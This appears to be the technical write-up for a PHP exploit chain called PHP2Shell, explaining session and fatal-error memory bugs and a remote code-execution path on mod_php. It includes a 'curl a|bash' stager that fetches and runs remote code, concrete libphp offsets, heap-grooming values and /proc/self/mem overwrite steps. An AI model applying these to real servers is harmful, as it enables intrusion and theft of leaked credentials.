# PHP2Shell — Technical Analysis

> Deep dive into the 4-bug chain, heap layout, offset calibration, and exploitation mechanics.

---

## Table of Contents

1. [Overview](#overview)
2. [Bug 1: Session Upload-Progress Stale Global (CVE-2026-109619)](#bug-1-session-upload-progress-stale-global)
3. [Bug 2: Session Cookie Memory Disclosure (CVE-2026-109618)](#bug-2-session-cookie-memory-disclosure)
4. [Bug 3: Fatal-Error Backtrace UAF](#bug-3-fatal-error-backtrace-uaf)
5. [Bug 4: OPcache Type Confusion](#bug-4-opcache-type-confusion)
6. [Exploit Chain: Remote RCE](#exploit-chain-remote-rce)
7. [Heap Layout & Offset Calibration](#heap-layout--offset-calibration)
8. [PHP 8.3.x Local RCE Path](#php-83x-local-rce-path)

---

## Overview

The PHP2Shell chain exploits fundamental flaws in PHP's session upload progress handler. The core insight: PHP's multipart POST parsing initializes the session **before** `RINIT` (Request INITialization) completes. When an OOM (Out-Of-Memory) error occurs during `php_session_initialize()`, the request tears down with `PG(modules_activated) = 0`, causing the session RSHUTDOWN cleanup to be **skipped**. This leaves `PS(http_session_vars)` pointing at request-owned memory that is freed with the request heap — a **dangling pointer** in process-global state.

On `mod_php` with `mpm_prefork`, the Apache worker process **survives** the fatal error and handles subsequent requests. The stale pointer from Request A persists into Request B.

## Bug 1: Session Upload-Progress Stale Global

**CVE:** CVE-2026-109619  
**Root Cause:** `PS(http_session_vars)` not cleared in the OOM fast-shutdown path.

### Attack Flow

```
Request A (Producer):
  1. Multipart POST with PHP_SESSION_UPLOAD_PROGRESS field
  2. PHP initializes session inside multipart callback (before RINIT)
  3. memory_limit OOM -> php_session_initialize() bails out
  4. PG(modules_activated) = 0 -> session RSHUTDOWN is SKIPPED
  5. PS(http_session_vars) = dangling pointer to freed request heap
  6. Worker process survives (mod_php prefork)

Request B (Consumer):
  7. Another multipart POST to the SAME worker
  8. Multipart fields parsed into request heap -> reclaim freed memory
  9. php_session_initialize() runs again
  10. php_session_track_init() calls zval_ptr_dtor() on stale reference
  11. zval_ptr_dtor -> zend_reference_destroy -> zend_array_destroy
      -> zend_hash_destroy -> pDestructor(&bucket->val)
  12. pDestructor is zif_system() (via forged HashTable)
  13. system() executes attacker's command
```

### Key Constraints

- **Max command length:** 14 bytes (167-byte carrier - 0x98 header - NUL)
- **Workaround:** Use a stager: `curl a|bash` (12 bytes)
- **SAPI requirement:** `mod_php` only (prefork worker persistence)
- **Memory limit:** Must be low enough for OOM trigger (default 128M works)

## Bug 2: Session Cookie Memory Disclosure

**CVE:** CVE-2026-109618  
**Root Cause:** Stale session ID pointer leaks heap contents via `Set-Cookie` header.

### Mechanism

After Bug 1's producer request corrupts the session state:

1. The stale `PS(id)` pointer references freed heap memory
2. When the worker handles the next request, `php_session_start()` reads `PS(id)`
3. The freed memory now contains data from the current request's heap allocations
4. PHP sends this as the session cookie value: `Set-Cookie: PHPSESSID=<heap_data>`
5. The cookie contains **raw process memory** — pointers, strings, credentials

### What Gets Leaked

- **Zend MM chunk base address** (heap layout, 2MB-aligned)
- **libphp base address** (ASLR bypass for zif_system)
- **PHP strings** (passwords, DB credentials, API keys, session tokens)
- **Heap pointers** (enabling subsequent exploitation)

This is functionally equivalent to Heartbleed: reading server process memory through a normal HTTP response.

## Bug 3: Fatal-Error Backtrace UAF

**Scope:** PHP 8.5.0 – 8.5.11 with `fatal_error_backtraces=On`

### Mechanism

```
Request A (Producer): GET /oom.php
  - Script allocates until memory_limit -> fatal error
  - Fatal handler stores backtrace in EG(last_fatal_error_backtrace)
  - Fast-shutdown path skips clearing last_fatal_error_backtrace
  - Request heap freed, but EG reference persists -> DANGLING POINTER

Request B (Consumer): GET /index.php
  - .htaccess: php_value auto_detect_line_endings 1 (deprecated in 8.5)
  - Deprecation triggers zval_ptr_dtor(&EG(last_fatal_error_backtrace))
  - Stale pointer -> USE AFTER FREE
```

### Evidence

```
Valgrind:
  ==19== definitely lost: 328 bytes in 2 blocks
  ==19== 72 bytes in 1 blocks are definitely lost
  ==19== 280 (256 direct, 24 indirect) bytes are definitely lost
```

### Patch (PHP 8.5.12)

Added unconditional `ZVAL_UNDEF(&EG(last_fatal_error_backtrace))` at end of `shutdown_executor()`, running in BOTH fast-shutdown and full-cleanup paths.

## Bug 4: OPcache Type Confusion

**Scope:** PHP 8.x with OPcache enabled  
**Status:** Research-stage primitive

OOM during OPcache SHM operations can leave type metadata in an inconsistent state. When subsequent requests read cached entries, the type confusion allows controlled memory access.

### Observed Behavior

```
19 OOM precondition events triggered
Type confusion in SHM cached entries after recovery
```

This primitive is less reliable than Bugs 1–3 and requires further heap grooming research.

**Measurement note:** `exploit/bug4_opcache_confusion.py` distinguishes *confirmed* signals (inconsistencies reported by the lab's `lab/www-bug4/opcache_probe.php` JSON endpoint, compared against a baseline) from *weak heuristic* signals (HTTP 5xx / body substrings). Only crashes and probe-confirmed anomalies exit with success; 5xx alone is reported as inconclusive.

## Exploit Chain: Remote RCE

The full remote RCE chain (used in `php2shell_exploit.py`) combines Bug 1 and Bug 2:

### Stage 1: Heap Address Leak

1. Send producer request (OOM trigger) to corrupt session state
2. Send consumer request with crafted multipart fields
3. The `Set-Cookie` header contains leaked heap pointers
4. Extract Zend MM chunk base (2MB-aligned, appears 8+ times)

### Stage 2: libphp Base Leak

1. Rotate worker, send another producer/consumer pair
2. Cookie data at offset +8 contains `pDestructor` pointer
3. `pDestructor` = `libphp_base + dtor_offset`
4. Calculate: `libphp_base = pDestructor - dtor_offset`
5. This defeats ASLR completely

### Stage 3: Code Execution

1. Calculate: `zif_system = libphp_base + zif_offset`
2. Calculate: `htdata = chunk_base + htdata_offset`
3. Craft a forged `HashTable` in the multipart payload:
   - `pDestructor` → `zif_system`
   - Bucket value → forged `zend_string` containing the command
4. Send consumer request — `zval_ptr_dtor` follows the chain:
   ```
   zval_ptr_dtor → zend_reference_destroy → zend_array_destroy
   → zend_hash_destroy → pDestructor(&bucket->val)
   → zif_system("id>/out/p")
   ```

## Heap Layout & Offset Calibration

### Default Offsets (PHP 8.4.26 Debian Apache)

```
LINUX_ZIF_OFFSET    = 0x465370    # zif_system in libphp.so
LINUX_DTOR_OFFSET   = 0x65EB60    # zval_ptr_dtor in libphp.so
LINUX_HTDATA_OFFSET = 0x690D8     # chunk-relative target address
```

### Calibration Process

`tools/calibrate_offsets.py` automates steps 1–2:

```bash
nm -D /usr/lib/apache2/modules/libphp.so > nm_cikti.txt   # on the target
python3 tools/calibrate_offsets.py --nm nm_cikti.txt       # exploit-ready output
python3 tools/calibrate_offsets.py --binary /path/to/libphp.so  # runs nm for you
python3 tools/calibrate_offsets.py --nm nm_cikti.txt --json
```

1. **Find zif_system:** `nm -D /usr/lib/apache2/modules/libphp.so | grep zif_system`
2. **Find zval_ptr_dtor:** `nm -D /usr/lib/apache2/modules/libphp.so | grep zval_ptr_dtor`
3. **htdata offset:** Heap profiling with debug builds — **cannot** be derived from `nm`; the calibration tool reports this explicitly instead of guessing.

### Heap Grooming Parameters

```python
STAGE1_FILLERS = 841    # Multipart fields for heap spray (stage 1)
STAGE2_FILLERS = 983    # Fields for libphp leak (stage 2)
STAGE2_TARGET  = 406    # Target field index
STAGE2_VALUE_LEN = 16   # Value length for controlled reclaim
```

These values were calibrated empirically against `wordpress:6.7-php8.4-apache`. Different PHP builds or Linux distributions may require re-calibration.

## PHP 8.3.x Local RCE Path

The `php2shell_836_poc.php` exploit uses a different approach — no session bugs needed:

1. Read `/proc/self/maps` → find PHP binary base address
2. Read `/proc/self/mem` → traverse `executor_globals.function_table`
3. Locate `zif_system` and `var_dump` handler addresses
4. Overwrite `var_dump` handler pointer with `zif_system`
5. Call `var_dump($command)` → executes `system($command)` → RCE
6. Restore original handler (cleanup)

### Requirements

- PHP 8.3.0–8.3.35
- `/proc/self/mem` read/write access (default on many Linux distros)
- CLI or web (LFI/upload vector needed for remote exploitation)

---

## References

- [Wiz Research: PHP2Shell](https://www.wiz.io/blog/php2shell-php-rce)
- [PHP Internals: Session Upload Progress](https://www.php.net/manual/en/session.upload-progress.php)
- [Zend MM Allocator Internals](https://www.phpinternalsbook.com/php7/memory_management/zend_memory_manager.html)
- [GHSA-6wmf-4rv5-p3rp](https://github.com/advisories) *(advisory pending publication)*
